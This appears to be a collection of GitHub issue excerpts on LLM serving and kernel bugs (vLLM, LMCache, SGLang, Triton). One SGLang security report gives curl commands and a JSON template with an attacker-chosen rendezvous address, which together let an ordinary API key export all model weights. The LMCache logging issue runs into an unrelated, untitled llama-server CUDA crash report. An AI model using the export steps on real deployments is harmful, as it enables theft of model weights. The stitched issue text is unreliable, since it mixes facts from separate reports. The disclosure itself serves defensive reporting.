items.title: [Feature]: Shared per choice `ChatStreamProcessor` for chat serving and streaming derender
items.author: hickeyma
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Tracking issue for a follow up from the #50550 review, where @sagearc asked whether streaming chat derender could use a shared `ChatStreamProcessor` (https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193).

#### Why

After #50550, streaming chat derender (`OnlineDerenderer._derender_chat_stream_parsed`) produces the same `reasoning` / `content` / `tool_calls` deltas that `/v1/chat/completions` streams for the same tokens. To do that it repeats the per choice post parse steps from `OpenAIServingChat.chat_completion_stream_generator`:

- building the parser (`parser_cls(tokenizer, tools, chat_template_kwargs=..., model_config=...)`)
- one `parse_delta` call per chunk
- tracking `tools_streamed`
- rewriting `finish_reason` to `tool_calls` unless a function was named in `tool_choice`
- `maybe_filter_parallel_tool_calls`

The two copies match today. Only code review keeps them that way until the streaming parity tests from #47161 PR3 land and any change to parser handling has to be made in both places. Streaming logprobs on the parsed derender path (after #55029) will add another shared rule drop: logprobs and token IDs when reasoning is hidden (`hide_stream_metadata` in serving).

#### Proposal

Pull a per choice processor out of `chat_completion_stream_generator`. It owns the parser and `tools_streamed` and handles one chunk per step: `parse_delta` → `finish_reason` → parallel tool call filter.

- **Chat serving** uses it for live output. The generator keeps what only serving needs:
  - skipping `None` deltas (unless it's the finish chunk or `return_token_ids` is set)
  - reasoning token counts for usage
  - delta logging
  - error finish reasons
  - `stop_reason` and `token_ids` on the chunk
- **Streaming derender** uses it for both replay and the current chunk. The derenderer keeps what only derender needs:
  - the replay loop over `output_chunk_lens`
  - tool call ID pinning via `last_tool_call_ids`
  - always returning a chunk
  - reading and returning `stream_state`

Responses API streaming stays out. It also calls `parse_delta` but emits a different event shape.

The shared part is thin, so getting the interface right matters more than how much code moves. For chat serving this is a pure refactor with no change to what `/v1/chat/completions` streams. ChatStreamProcessor` is the name from the review and it can change.

#### Sequencing

This should come after #50550 and streaming logprobs (#55029, then the parsed path), so the processor is shaped around both users as they end up. The chat streaming change can then be reviewed on its own. If this lands before the parser cache (#57571), the cache could hold this processor instead of a bare `Parser`.

#### Done when

- [ ] Processor extracted from `chat_completion_stream_generator`. Existing chat streaming and reasoning / tool parser tests pass unchanged.
- [ ] Streaming chat derender moved onto it. `test_derender_stream.py` passes unchanged.
- [ ] The hidden reasoning rule for logprobs and token IDs lives in the processor, so the parsed derender path applies it too.

### Alternatives

- **Do it before #50550 merges as a small PR that #50550 rebases on.** I proposed this in the review (https://github.com/vllm-project/vllm/pull/50550#discussion_r4005719757), then switched to a follow up (https://github.com/vllm-project/vllm/pull/50550#discussion_r4035126957). The code around the shared steps differs enough that it's easier to shape the processor once derender streaming and #55029 are in.
- **Keep the two copies.** Cheapest option. The streaming parity tests from #47161 PR3 would catch drift after the fact but every parser handling change would still have to be made twice.
- **Include the Responses API loop.** It emits a different event shape, so it's a bigger change for little gain.

### Additional context

- RFC #47161 (streaming derender), PR #50550
- #50550 review thread: https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193
- #55029: streaming logprobs for derender
- Parser cache / server side parser state: #57571

cc @sagearc @chaunceyjiang

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: [Bug] Logging calls pass more args than their format string consumes, so the message is dropped at runtime
items.author: alooshxl
items.body_excerpt:
### Describe the bug

Three `logger.*` calls in `lmcache/` pass more positional arguments than their format string consumes.

`logging` renders a record lazily as `msg % args`, so these calls raise `TypeError: not all arguments converted during string formatting` *inside* the logging machinery. Python's logging catches that and prints `--- Logging error ---` plus a traceback to stderr — **the intended message is never emitted**.

All three sit on failure paths, which is exactly where losing the message hurts most.

**1. `lmcache/v1/storage_backend/p2p_backend.py:155`** — two arguments, one placeholder. The caught exception `e` is silently dropped:

```python
except Exception as e:
    logger.error("Failed to close peer %s lookup socket", self.peer_init_url, e)
```

**2. `lmcache/v1/storage_backend/connector/mock_connector.py:266`** and **3. `mock_connector.py:278`** — a stray comma where implicit string concatenation was intended, so the message is truncated and its tail silently becomes an argument:

```python
logger.warning(
    f"Mock object is None on {i}",
    f" out of {len(mock_objs)} objects",
)
```

```python
logger.warning(
    "Failed to allocate memory even with",
    f" busy loop on {i} out of {len(mock_objs)} objects",
)
```

### To Reproduce

```python
import logging, sys

logging.basicConfig(level=logging.DEBUG, stream=sys.stdout)
log = logging.getLogger("repro")
log.error("Failed to close peer %s lookup socket", "tcp://1.2.3.4:80", ValueError("boom"))
```

Output — note the message and the exception are both lost:

```
--- Logging error ---
Traceback (most recent call last):
  ...
  File ".../logging/__init__.py", line 400, in getMessage
    msg = msg % self.args
          ~~~~^~~~~~~~~~~
TypeError: not all arguments converted during string formatting
Message: 'Failed to close peer %s lookup socket'
Arguments: ('tcp://1.2.3.4:80', ValueError('boom'))
```

### Why CI does not catch this today

Ruff's `PLE1205` / `PLE1206` (logging too-many / too-few args) are not in the `select` list in `pyproject.toml`, and `G` (flake8-logging-format) is commented out.

Enabling **only** `PLE1205` and `PLE1206` reports exactly the two static cases above and nothing else repo-wide, so the rules can be turned on with no additional cleanup:

```
$ ruff check --select PLE1205,PLE1206 .
lmcache/v1/storage_backend/connector/mock_connector.py:278:17: PLE1205 Too many arguments for `logging` format string
lmcache/v1/storage_backend/p2p_backend.py:155:13: PLE1205 Too many arguments for `logging` format string
Found 2 errors.
```

(For contrast, the full `G` ruleset currently reports 511 findings, mostly the f-string logging that is already being migrated incrementally — so `G` is deliberately out of scope here.)

Ruff cannot see through the f-string in case 2, so that variant needs a small test to stay covered while the f-string → `%`-format migration is in progress.

### Environment

- LMCache `dev` @ `0373a573`
- Bugs introduced in #1500 (Sep 2025) and #2148 (Dec 2025); both still present on `dev`.

I have a fix ready and will open a PR referencing this issue.

CUDA

### Hardware

NVIDIA GeForce RTX 4080 SUPER (16 GB), driver 617.14. 62 GB RAM.

### Models

google/gemma-4-12B-it-qat-q4_0-gguf: `gemma-4-12b-it-qat-q4_0.gguf` with `mmproj-gemma-4-12b-it-qat-q4_0.gguf` (both from the HF repo, snapshot 29d0977).

### Problem description & steps to reproduce

Server command line:

```
llama-server.exe -m gemma-4-12b-it-qat-q4_0.gguf -ngl 999 -fa on -c 32768 -np 1 --no-context-shift --host 127.0.0.1 --port <port> -rea off --reasoning-format none -mm mmproj-gemma-4-12b-it-qat-q4_0.gguf
```

A chat completion over `/v1/chat/completions` with one image (1024x1024 PNG, base64 data URL) plus about 4.5k tokens of text (system prompt and conversation) kills the server with a CUDA illegal memory access. Sometimes the first request with the image dies, sometimes the first succeeds and the second (same slot, prompt cache hit, ~100 new tokens) dies. Text-only requests of the same size die much more rarely (1 of 4 runs).

The same model, the same flags and the same requests run fine on the Linux Docker image (build b10257, CUDA 13.3) on the same card.

Windows Event Log for each crash: `llama-server.exe`, exception 0xc0000409 in ucrtbase.dll (fail fast / abort).

Unknown; b10268 (August) already shows it, less often than b11577.

items.title: [Bug]: HA snapshot recovery does not update applied sequence metric
items.author: Icedcoco
items.body_excerpt:
### Bug Report

### Summary

When an HA standby starts from a batch OpLog snapshot, the snapshot state and recovery cursor are restored successfully, but the exported `ha_oplog_applied_sequence_id` metric remains at its initial value. This makes the metric disagree with the standby's actual recovery position.

### Reproduction

The issue is reproducible with a snapshot whose recovered sequence is `117` and which has no incremental OpLog entries to apply after the snapshot:

1. Create and publish a valid batch OpLog snapshot covering sequence `117`.
2. Start an HA standby with snapshot bootstrap enabled.
3. Allow snapshot recovery to complete and the standby to enter `WATCHING`.
4. Read the standby metrics and synchronization status.

Observed result:

```text
recovery log:          snapshot/applied = 117
OpLogApplier expected:  118
snapshot applied batch: 51
standby state:          WATCHING
sync status applied:    117
ha_oplog_applied_sequence_id: 0
```

The standby's internal cursor and synchronization status show that sequence `117` has been recovered, while the exported applied-sequence gauge still reports `0`.

### Root cause

`OpLogApplier::Recover(last_applied_sequence_id)` updates only `expected_sequence_id` to `last_applied_sequence_id + 1`. It does not update the HA applied-sequence gauge.

The gauge is currently updated when an individual `ApplyOpLogEntry` succeeds. The snapshot bootstrap path installs the recovered baseline through `HotStandbyService::LoadBatchOpLogSnapshotBaselineLocked` and updates the standby's internal `applied_seq_id_`, but does not update `ha_oplog_applied_sequence_id`. Therefore, a snapshot with an empty incremental tail leaves the exported gauge at its initial value.

### Impact

- Monitoring reports an incorrect applied sequence immediately after snapshot recovery.
- Any alert, readiness check, or recovery validation based on `ha_oplog_applied_sequence_id` or derived lag can report a false failure or an incorrect recovery state.
- Operators cannot distinguish a metric reporting error from an actual OpLog replay failure using the exported metrics alone.

This is an observability and recovery-validation defect. The current evidence does not indicate data loss or incorrect recovered object metadata; the internal recovery cursor is correct.

### Expected behavior

After a successful snapshot recovery, `ha_oplog_applied_sequence_id` must equal the latest sequence represented by the recovered baseline, even when no incremental OpLog entries follow it:

```text
snapshot_applied_sequence = 117
ha_oplog_applied_sequence_id = 117
expected_sequence_id = 118
```

When incremental entries are subsequently applied, the metric must continue advancing to the latest successfully applied sequence.

### Scope of the fix

Synchronize the applied-sequence gauge with the recovered baseline during snapshot/bootstrap installation. Check all recovery paths that establish a baseline, including batch snapshot recovery, ordinary snapshot recovery, and local warm restart, so that the metric does not depend on at least one later OpLog entry being replayed.

Do not change the recovered cursor or treat the metric as the source of truth; the metric should reflect the already recovered cursor.

### Acceptance criteria

Add regression coverage for:

1. Snapshot recovery with no incremental OpLog tail.
2. Snapshot recovery followed by incremental entries.
3. A baseline at sequence `0`.
4. Consistency between the applied sequence, expected sequence, snapshot batch, and lag metrics.

The tests should verify both the internal synchronization status and the exported `ha_oplog_applied_sequence_id` metric.

### Additional context

The metric is defined as the "Latest OpLog sequence ID applied by Standby". A successful snapshot recovery already reports the recovered sequence in recovery logs and synchronization status, so the exported metric should expose the same value rather than remain at its process-start default.

items.title: [Bug]  DSV4.1 Flash + DSPARK: CUDA caching allocator exhausts GPU memory under sustained max-batch decode (OOM crash every 15–25 min), KV pool only 29% used
items.author: elain
items.body_excerpt:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [ ] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [ ] Please use English. Otherwise, it will be closed.

### Describe the bug

Serving DeepSeek-V4.1-Flash with DSPARK speculative decoding on a single 8×B200 node is **stable under short benchmark windows (< 6 min) but crashes on a fixed ~15–25 minute cadence under sustained max-batch decode load**. Every crash has the same signature: all 8 TP ranks fail a 20 MB `expandable_segments` mapping with only 4–19 MB free, then the engine kills its own process tree. Docker restarts it, and it crashes again ~15–25 min later. Over a 2-hour sustained soak: **6 crashes, identical signature**.

Crucially this is **not a KV-cache capacity problem** — at crash time `full token usage: 0.29, swa token usage: 0.16` (KV pool `max_total_num_tokens=25,826,048`, ~71% of KV headroom unused). The PyTorch caching allocator's non-KV memory grows unboundedly under sustained load.

**Allocator failure — all 8 ranks within the same second (two shown):**

[rank0]:[W1010 01:38:17.257967532 CUDACachingAllocator.cpp:508] expandable_segments: memory mapping failed with OOM on device 0 while trying to map 20971520 bytes (free: 4718592, total: 191502876672).
[rank4]:[W1010 01:38:17.258494500 CUDACachingAllocator.cpp:508] expandable_segments: memory mapping failed with OOM on device 4 while trying to map 20971520 bytes (free: 19398656, total: 191502876672).

**Crash handler immediately after:**

[2026-10-10 01:38:23] kill_process_tree called: parent_pid=1, include_parent=True, pid=1
[2026-10-10 01:38:24] No live scheduler processes found; skipping py-spy and CUDA coredump.
[2026-10-10 01:38:24] SIGQUIT received. signum=None, frame=None. It usually means one child failed.

**KV pool NOT exhausted at crash time** (last scheduler lines before death):

Prefill batch, #new-seq: 1, #new-token: 512, #cached-token: 48896, full token usage: 0.29, swa token usage: 0.16, #running-req: 195, #queue-req: 0

**Mitigation experiments we already ran (both failed, so this looks like unbounded growth, not headroom sizing):**

1. Removing `PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True` → the server crashes even under trivial load (single-digit concurrent probes) right after startup; the fixed-segment allocator is strictly worse here.
2. Lowering `--mem-fraction-static` 0.75 → 0.73 (frees ~3.8 GB/GPU for the allocator) → **crash cadence unchanged** (4 crashes in 5 sustained windows), same signature.

**Related issues checked and ruled out:**
- #36333 (zombie requests after client disconnect): zero occurrences of `"state was deleted in TokenizerManager"` in our logs.
- #37553 (unbounded `custom_mask` via `torch.cat` in EAGLE/DFlash): DSPARK's verify path passes `custom_mask=None` throughout (`dspark_components/dspark_verify.py`), so it does not use that code path.

Secondary observation: before each crash, sustained throughput degrades ~15–20% vs short-window burst and TTFT/ITL p95 drift up, consistent with growing allocator pressure. This makes the current V4.1 preview unfit for sustained saturated serving on our node (`--restart unless-stopped` recovers in ~8 min per crash as a stopgap). Sustained-load stability may be worth adding to the V4.1 roadmap (#42170) — short-window benchmarks cannot catch this bug class. Happy to provide full container logs / dmesg / workload details on request.

### Reproduction

1. Start the server with the command below.
2. Drive **sustained** saturating decode load at high batch — we replay real SWE agent traces at ~192 concurrent sticky sessions with continuous streaming requests (each request carries its full session prefix, up to ~300K tokens). Any sustained max-batch decode workload with DSPARK on should work.
3. Within 15–25 minutes the process dies with the allocator signature above; docker restarts it; it dies again every 15–25 min.
4. Note: 6-minute benchmark windows never trigger it — the failure only appears under sustained load, so a quick `bench_serving` pass will look clean.

Launch command:

```bash
docker run -d --name sglang_standalone --network host --ipc host --gpus all \
  --shm-size 67108864 --restart unless-stopped \
  -v /data/models/deepseek-ai/DeepSeek-V4.1-Flash:/models:ro \
  -e SGLANG_TIMEOUT_KEEP_ALIVE=60 -e PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True \
  lmsysorg/sglang:dev-dsv41 python3 -m sglang.launch_server \
  --model-path /models --served-model-name deepseek-v4.1-flash \
  --tp 8 --host 0.0.0.0 --port 30000 --trust-remote-code \
  --context-length 1048576 --page-size 64 --mem-fraction-static 0.75 \
  --chunked-prefill-size 32768 --max-prefill-tokens 32768 \
  --max-running-requests 256 --enable-cache-report --enable-metrics \
  --enable-decoder-swa-bounded-replay \
  --speculative-algorithm DSPARK --speculative-dspark-block-size 5 \
  --log-level info

Startup reference numbers: max_total_num_tokens=25826048, available_gpu_mem≈20.5 GB after init.

### Environment

```markdown
- Hardware: 8 × NVIDIA B200 (192 GB each, SM100), single node, NVLink, host network
- Driver / CUDA: 580.178.04 / CUDA 13.0.3 (in container); torch 2.13.0+cu130; NCCL 2.30.7
- SGLang: `lmsysorg/sglang:dev-dsv41@sha256:4a5d132a06a7` (sglang 0.0.0.dev1+gda64c5cbb) — this is still the newest V4.1 preview digest as of 2026-10-10
- Model: DeepSeek-V4.1-Flash (476 GB, bundled 3-stage DSPARK draft, `num_nextn_predict_layers=3`)
- Workload: SWE agent-trace session replay — 400 sticky sessions replayed continuously, ~192 concurrent sessions, streaming (`stream=true`, `include_usage`), per-request prompts carry full session history (up to ~300K tokens)
- Quant/KV defaults: KV dtype fp8_e4m3, attention backend dsv

items.title: [Bug] DeepSeek-V4.1-Flash (dsv4 + DSPARK): multi-turn prefix cache degrades to a constant ~11.5K-token hit — 60–80K conversation prefix re-prefilled every turn (GLM-5.3-Flash unaffected in the same   environment)
items.author: F0rtiter
items.body_excerpt:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [ ] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

Serving DeepSeek-V4.1-Flash (dsv4 / FlashMLA hybrid KV pool, DSPARK speculative decoding) for
  Claude Code traffic (Anthropic `/v1/messages` via a relay). Prefix reuse works correctly at the
  beginning of the run; after the server has been up for a while, **every turn of a long agentic
  session hits exactly 11,520 cached tokens and re-prefills the whole 60–80K-token conversation
  prefix**, and the state persists.

  Log excerpt — consecutive turns ~10 s apart (TP0, default `--chunked-prefill-size 4096`;
  `#cached-token: 0` on chunks 2..N of the *same* request is expected for chunked prefill — the
  problem is that the first chunk's hit never grows across turns):

  ```
  [21:51:38] Prefill batch, #new-seq: 1, #new-token: 4096, #cached-token: 11520, full token usage: 0.00, swa token usage: 0.00, ... #pending-token: 60864
  [21:51:38–45]  15 more chunks of the same turn, all #cached-token: 0, #pending-token: 60864 → 0
                 → turn total ≈ 76,480 prompt tokens, 64,960 recomputed
  [21:51:46] Prefill batch, #new-token: 4096, #cached-token: 11520, #pending-token: 62293   → turn ≈ 77,909 tokens (+~1.4K vs previous turn)
  [21:51:55] Prefill batch, #new-token: 4096, #cached-token: 11520, #pending-token: 66335   → turn ≈ 81,951
  [21:52:06] Prefill batch, #new-token: 4096, #cached-token: 11520, #pending-token: 67712   → turn ≈ 83,328
  ```

  Expected: turn N+1 is a strict append of turn N, so it should hit ≈ turn N's full prompt and
  prefill only the appended ~1–4K tokens. Observed: hit pinned at exactly 11520 (45 × 256-token
  pages — consistent with the stable system prompt), everything after it recomputed.

Key observations:

  - **GLM-5.3-Flash control:** with the *same* host, relay, and Claude Code client, GLM-5.3-Flash
    shows normal multi-turn prefix hits on comparable traffic. Only DeepSeek-V4.1-Flash degrades.
    This argues against the client-side causes documented in #35129 (`cch=` request mutation,
    task-list snapshot churn), since those would corrupt prefixes for any model behind the same
    relay.
  - `full token usage: 0.00` / `swa token usage: 0.00` while `#full token` ≈ 76–82K → the device
    pool is nowhere near full; plain capacity eviction should not produce a *stable* miss boundary.
  - The hit length is byte-stable at 11520 across turns → the effective divergence point sits right
    after the system prompt.
  - DSPARK speculative decoding is active (decode logs show `accept len` 3.4–4.8).
  - Earlier in the run, multi-turn hits were normal.

  Relation to #35129: same family (DSv4 + Flash + Claude Code agentic sessions; long multi-chunk
  requests lose prefix reuse). Of the three causes #35129 closed with, HiCache load-back eviction
  storms are ruled out by configuration here (no `--enable-hierarchical-cache`;
  `SGLANG_ENABLE_DSV41_ENGRAM_HOST_TABLE=1` only offloads the engram *embedding* hash table to host
  memory, not the KV path), and the two client-side causes are made unlikely by the GLM control
  above.

Suspected area (not yet verified — the dsv4.1-specific cache structures that GLM-5.3-Flash does
  not share):

  - the DSv4 compressed indexer sidecars (c4 / c128 pools, `deepseek_v4_memory_pool.py`,
    `index_key_cache.py`, `deepseek_v4_compress_state.py`) — if a bounded auxiliary structure stops
    accepting or exposing entries once full, matches would get capped at a stable boundary exactly
    like this, while `full token usage` stays ~0;
  - SWA-tombstone match validation in the unified tree (`unified_cache/components/swa.py`);
  - radix-cache insertion on the DSPARK verify path (`speculative/dspark_components/`).

  Diagnostics (happy to post results):

  1. **Identical-body replay:** send the same >64K-token request twice back-to-back and compare
     `#cached-token` — distinguishes engine-side (second request still only hits 11520) from
     request-content drift.
  2. A/B with `--speculative-algorithm` removed, same traffic.
  3. Watch `evicted_tokens_total` / pool usage on `/metrics` across the degradation moment.

### Reproduction

- Model: DeepSeek-V4.1-Flash, `--attention-backend dsv4` (`page_size=256` auto-forced), TP=8 / EP=1,
    `--speculative-algorithm DSPARK`, default `--chunked-prefill-size 4096`.
  - Workload: Claude Code sessions over `/v1/messages`; turn N+1 = turn N + appended messages;
    prompts grow 76K → 83K tokens. Degradation appears after the server has been running for a
    while and then persists.
  - Minimal form: any two consecutive append-only requests whose prompt spans several
    chunked-prefill chunks (~64K+ tokens here) sent seconds apart; in the degraded state every turn
    logs `#cached-token: 11520`.

  Launch command (Docker, image `lmsysorg/sglang:dev`):

 ```
  sglang serve \
    --model-path /models/DeepSeek-V4.1-Flash \
    --host 0.0.0.0 --port 8000 \
    --tp 8 --ep-size 1 \
    --chunked-prefill-size 4096 \
    --enable-decoder-swa-bounded-replay \
    --attention-backend dsv4 \
    --moe-runner-backend marlin \
    --cuda-graph-max-bs-decode 64 \
    --max-running-requests 64 \
    --reasoning-parser auto --tool-call-parser auto \
    --served-model-name reasoner \
    --mem-fraction-static 0.8 \
    --trust-remote-code \
    --swa-prefix-tails 1024 \
    --enable-metrics --enable-cache-report \
    --speculative-algorithm DSPARK \
    --speculative-dspark-block-size 5 \
    --watchdog-timeout 3600

  # container env (not KV-cache related, listed for completeness):
  #   SGLANG_ENABLE_DSV41_ENGRAM_HOST_TABLE=

items.title: [Bug] Ordinary API key can trigger remote-instance weight export
items.author: JPengLi
items.body_excerpt:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

The remote-instance weight-loading control endpoints are exposed through the model HTTP API and are marked `AuthLevel.ADMIN_OPTIONAL`:

- `POST /init_weights_send_group_for_remote_instance`
- `POST /send_weights_to_remote_instance`

In a deployment with `--api-key` but without `--admin-api-key`, an ordinary API-key holder can access both routes. The request controls the rendezvous address, per-rank ports, group rank, world size, group name, and process-group backend.

The sink iterates over every model parameter and broadcasts it:

```python
# python/sglang/srt/model_executor/model_runner_components/weight_exporter.py
for _, weights in self.get_model().named_parameters():
    torch.distributed.broadcast(
        weights,
        src=0,
        group=send_group,
    )
```

Thus the security boundary for model-weight confidentiality depends only on the caller being able to reach the optional-admin HTTP route and the rendezvous network. There is no separate allowlist, authentication token for the receiving rank, model-owner confirmation, or confidentiality check on the transfer group.

The ordinary-key authorization behavior itself is known, but I did not find a public report describing these remote-instance endpoints as a complete model-weight export chain.

### Reproduction

The following isolated dynamic test was run with SGLang v0.5.19. The server was started with only an ordinary API key and no admin key:

```bash
python3 -m sglang.launch_server \
  --model-path /models/Qwen2.5-0.5B-Instruct \
  --host 127.0.0.1 \
  --port 30200 \
  --api-key user-secret \
  --tp-size 1
```

A one-rank self-broadcast proves that an ordinary key can traverse both HTTP routes and complete the production weight-export implementation:

```bash
curl -sS -X POST http://127.0.0.1:30200/init_weights_send_group_for_remote_instance \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' \
  -d '{
    "master_address": "127.0.0.1",
    "ports": "29301",
    "group_rank": 0,
    "world_size": 1,
    "group_name": "audit-self",
    "backend": "gloo"
  }'
```

Observed:

```json
{
  "success": true,
  "message": "Succeeded to init group through 127.0.0.1:29301 group."
}
```

Then:

```bash
curl -sS -X POST http://127.0.0.1:30200/send_weights_to_remote_instance \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' \
  -d '{
    "master_address": "127.0.0.1",
    "ports": "29301",
    "group_name": "audit-self"
  }'
```

Observed:

```json
{
  "success": true,
  "message": "Succeeded to send weights through 127.0.0.1:29301 audit-self_29301_0."
}
```

For the security-oriented two-rank case, the attacker-controlled receiver needs to join the same process-group rendezvous as rank 1 with matching parameter order, shapes, and dtypes, while the server request uses:

```json
{
  "master_address": "attacker-reachable-address",
  "ports": "one-port-per-server-tp-rank",
  "group_rank": 0,
  "world_size": 2,
  "group_name": "attacker-controlled-name",
  "backend": "attacker-selected-supported-backend"
}
```

A successful `send_weights_to_remote_instance` call then makes the server iterate over all `named_parameters()` and transmit each tensor to the receiver. I verified the HTTP authorization and one-rank server-side sink dynamically, but the isolated cross-process rank-1 receiver was not completed in the available environment. Therefore this report claims dynamic confirmation of the exposed management chain and source confirmation of the two-rank export sink, not a full external weight-exfiltration replay.

### Evidence

Latest source audited at commit `51686cf8e7fee0ae773c5c9b8ede356507abef7b`:

```python
# python/sglang/srt/entrypoints/http_server.py:1279-1280
@app.post("/init_weights_send_group_for_remote_instance")
@auth_level(AuthLevel.ADMIN_OPTIONAL)
```

```python
# python/sglang/srt/entrypoints/http_server.py:1298-1299
@app.post("/send_weights_to_remote_instance")
@auth_level(AuthLevel.ADMIN_OPTIONAL)
```

```python
# python/sglang/srt/model_executor/model_runner_components/weight_exporter.py:109-114
for _, weights in self.get_model().named_parameters():
    torch.distributed.broadcast(
        weights,
        src=0,
        group=send_group,
    )
```

Dynamic v0.5.19 observations:

```text
wrong bearer key                 -> HTTP 401
ordinary API key                 -> HTTP 200
init remote-instance group       -> HTTP 200, success=true
send weights to remote instance  -> HTTP 200, success=true
```

The receiver-side partial test loaded the same architecture, identified 290 parameters totaling 988,065,536 bytes, and recorded before/after digests, but its rendezvous did not complete. Those details are intentionally not used to overstate the result.

### Impact


- **Confidentiality: High:**

  - `admin_api_key` is not configured;
  - the attacker can reach the model HTTP API;
  - the attacker can participate in the selected distributed backend rendezvous;
  - the server and attacker have matching model parameter shapes and dtypes;
  - `dp_size == 1`, as required by the control implementation;
  - network policy permits the rendezvous connection.

- **Integrity: Low** for the dynamically validated sink, but the route exposes process-group control normally reserved for administrators.The validated broadcast path did not demonstrate tensor modification.
- **Availability: High.** The caller can create or block on attacker-selected process groups; repeated requests may tie up worker resources. S

items.title: fp16 and bf16 constants are rounded twice through fp32, 1 ulp off near ties
items.author: shuyilinn
items.body_excerpt:
### Describe the bug

fp16 and bf16 constants are rounded twice: from the Python float (a double) to fp32, and then to the 16-bit type. A value just above a 16-bit rounding tie loses the bits that break the tie, and the tie then rounds to even, 1 ulp too low.

```python
import numpy as np
import torch
import triton
import triton.language as tl


@triton.jit
def kernel(X, Z, V: tl.constexpr, N: tl.constexpr):
    offs = tl.arange(0, N)
    tl.store(Z + offs, tl.full([N], V, tl.float16))
    tl.store(Z + N + offs, tl.load(X + offs) * V)


v = 1 + 2**-11 + 2**-30  # just above the fp16 tie between 0x3C00 and 0x3C01
z = torch.empty(32, dtype=torch.float16, device="cuda")
kernel[(1, )](torch.ones(16, dtype=torch.float16, device="cuda"), z, V=v, N=16)
print(hex(z.view(torch.uint16)[0].item()), hex(z.view(torch.uint16)[16].item()))
print(hex(np.array([v], np.float16).view(np.uint16)[0]))
```

```
0x3c00 0x3c00
0x3c01
```

Expected `0x3c01` (what numpy gives) for both `tl.full` and the multiplication. bf16 has the same problem, e.g. `1 + 2**-8 + 2**-30` gives `0x3f80` instead of `0x3f81`.

`get_fp16` and `get_bf16` in `python/src/ir.cc` take a C++ `float`, so pybind rounds the double to fp32 before it is converted to the 16-bit type. In the interpreter, `get_bf16` also goes through fp32 (`get_fp16` uses numpy and is correct).

The error is at most 1 ulp, and only for values within an fp32 ulp of a 16-bit tie.

### Environment details

Triton: main @ 41846bc965
GPU: NVIDIA RTX 4090 (sm_89), driver 570 / CUDA 12.8

items.title: `tl.dot` with `input_precision="bf16x3"` or `"bf16x6"` and K=8 returns twice the product
items.author: shuyilinn
items.body_excerpt:
### Describe the bug

`tl.dot` on fp32 operands with `input_precision="bf16x3"` or `"bf16x6"` and K=8 returns exactly twice the product. K=8 is accepted for fp32 operands, and `ieee`, `tf32` and `tf32x3` give the right result at K=8.

```python
import torch
import triton
import triton.language as tl


@triton.jit
def kernel(A, B, C, K: tl.constexpr, PRECISION: tl.constexpr):
    m = tl.arange(0, 16)
    k = tl.arange(0, K)
    a = tl.load(A + m[:, None] * K + k[None, :])
    b = tl.load(B + k[:, None] * 16 + m[None, :])
    tl.store(C + m[:, None] * 16 + m[None, :], tl.dot(a, b, input_precision=PRECISION))


for precision in ["ieee", "tf32", "tf32x3", "bf16x3", "bf16x6"]:
    for K in (8, 16):
        a = torch.ones(16, K, device="cuda")
        b = torch.ones(K, 16, device="cuda")
        c = torch.empty(16, 16, device="cuda")
        kernel[(1, )](a, b, c, K, precision)
        print(f"{precision:7} K={K:2}: expected {K}, got {c[0, 0].item()}")
```

```
ieee    K= 8: expected 8, got 8.0
ieee    K=16: expected 16, got 16.0
tf32    K= 8: expected 8, got 8.0
tf32    K=16: expected 16, got 16.0
tf32x3  K= 8: expected 8, got 8.0
tf32x3  K=16: expected 16, got 16.0
bf16x3  K= 8: expected 8, got 16.0
bf16x3  K=16: expected 16, got 16.0
bf16x6  K= 8: expected 8, got 16.0
bf16x6  K=16: expected 16, got 16.0
```

The frontend allows K >= 8 for 32-bit operands (`min_dot_size` in `third_party/nvidia/backend/compiler.py`). `F32DotTC` then splits the fp32 dot into bf16 dots with the same K=8, below the K >= 16 that the frontend requires for 16-bit operands. `AccelerateMatmul` relies on that requirement when it picks the MMAv2 operand layout (the comment above the `minBitwidth` computation in `BlockedToMMA` says it assumes K >= 256 / bitwidth), so the bf16 dots with K=8 are lowered as if K were 16. All values are doubled, for every shape and `num_warps` I tried, including batched (3-D) dots.

### Environment details

Triton: main @ 41846bc965
GPU: NVIDIA RTX 4090 (sm_89), driver 570 / CUDA 12.8

items.title: [Bug]: prefix caching + MTP still corrupts output on hybrid Mamba/GDN models in v0.28.0 (#43559 closed but unfixed)
items.author: ionut-anghelina
items.body_excerpt:
### Your current environment
The output of python collect_env.py ```text ============================== System Info ============================== OS : Ubuntu 24.04.4 LTS (x86_64) GCC version : (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0 Libc version : glibc-2.39 ============================== PyTorch Info ============================== PyTorch version : 2.13.0+cu130 Is debug build : False CUDA used to build PyTorch : 13.0 ROCM used to build PyTorch : N/A ============================== Python Environment ============================== Python version : 3.12.3 (main, Jun 19 2026, 12:46:00) [GCC 13.3.0] (64-bit runtime) Python platform : Linux-6.8.0-1010-gcp-x86_64-with-glibc2.39 ============================== CUDA / GPU Info ============================== Is CUDA available : True CUDA runtime version : 12.0.140 GPU models and configuration : GPU 0-7: NVIDIA H100 80GB HBM3 (single GPU used for this report, TP=1) Nvidia driver version : 580.173.02 ============================== CPU Info ============================== Architecture: x86_64 Model name: Intel(R) Xeon(R) Platinum 8481C CPU @ 2.70GHz CPU(s): 208 Hypervisor vendor: KVM ============================== vLLM Info ============================== vLLM Version : 0.28.0 